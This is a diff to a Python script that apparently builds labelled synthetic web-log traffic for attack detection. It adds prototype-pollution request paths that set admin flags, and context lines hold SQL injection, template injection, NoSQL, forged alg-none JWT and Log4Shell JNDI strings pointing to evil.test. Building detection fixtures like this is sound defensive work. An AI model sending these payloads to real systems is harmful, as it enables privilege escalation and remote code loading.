@@ -557,6 +557,29 @@ def main() -> None:
     for i, p in enumerate(nosql_paths):
         add("nosql", f"198.18.1.{v4_last(10 + i)}", "GET", p)
 
+    proto_paths = [
+        "/api/merge?__proto__[admin]=1",
+        "/api/user?constructor[prototype][role]=admin",
+        "/graphql?query=mutation{__proto__{isAdmin:true}}",
+        "/api/v1/config?__proto__[polluted]=yes",
+        "/login?__proto__[password]=x",
+        "/api/object?constructor.prototype.admin=1",
+        "/api/clone?payload[__proto__][evil]=1",
+        "/api/update?data[constructor][prototype][isAdmin]=true",
+        "/api/v2/user?filter[__proto__][role]=admin",
+        "/api/merge?obj[__proto__][polluted]=1",
+        "/api/patch?__proto__[canEdit]=true",
+        "/api/save?nested[__proto__][admin]=1",
+        "/api/import?json[constructor][prototype][root]=1",
+        "/api/bind?__proto__[acl]=all",
+        "/api/extend?target[__proto__][superuser]=1",
+        "/api/assign?__proto__[permissions]=*",
+        "/api/override?payload[constructor.prototype][admin]=true",
+        "/api/elevate?__proto__[isAdmin]=1",
+    ]
+    for i, p in enumerate(proto_paths):
+        add("prototype_pollution", f"203.0.118.{v4_last(10 + i)}", "GET", p)
+
     jwt_paths = [
         "/api/me?token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.",
         "/auth?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.evil",
@@ -891,6 +914,7 @@ def main() -> None:
         ("brute", "POST", "/api/auth?user=admin%27+OR+1%3D1--&n={}", 401, UA_NORMAL),
         ("ssti", "GET", "/render?v=%7B%7B{}%2A7%7D%7D", UA_NORMAL),
         ("nosql", "GET", "/api/users?filter[$gt]={}", UA_NORMAL),
+        ("prototype_pollution", "GET", "/api/obj?__proto__[n]={}", UA_NORMAL),
         ("jwt_abuse", "GET", "/api/me?token=eyJhbGciOiJub25lIn0.evil{}", UA_NORMAL),
         ("log4shell", "GET", "/api?q=${{jndi:ldap://evil.test/{}}}", UA_NORMAL),
         ("open_redirect", "GET", "/redirect?url=//evil.test/{}", UA_NORMAL),
